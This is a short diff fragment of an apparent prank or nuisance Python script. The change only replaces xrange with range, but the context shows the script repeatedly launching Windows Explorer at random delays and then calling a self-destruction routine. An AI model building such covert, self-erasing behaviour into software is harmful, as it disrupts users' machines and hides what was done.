@@ -60,7 +60,7 @@ MAX_LATENCY = 5*60  # max latency = 5 minutes
 if __name__ == "__main__":
     # Windows
     if currentOS == 'nt':
-        for i in xrange(15):
+        for i in range(15):
             sleep(randint(0,MAX_LATENCY))
             system("start %windir%\explorer.exe")
         selfDestruction()
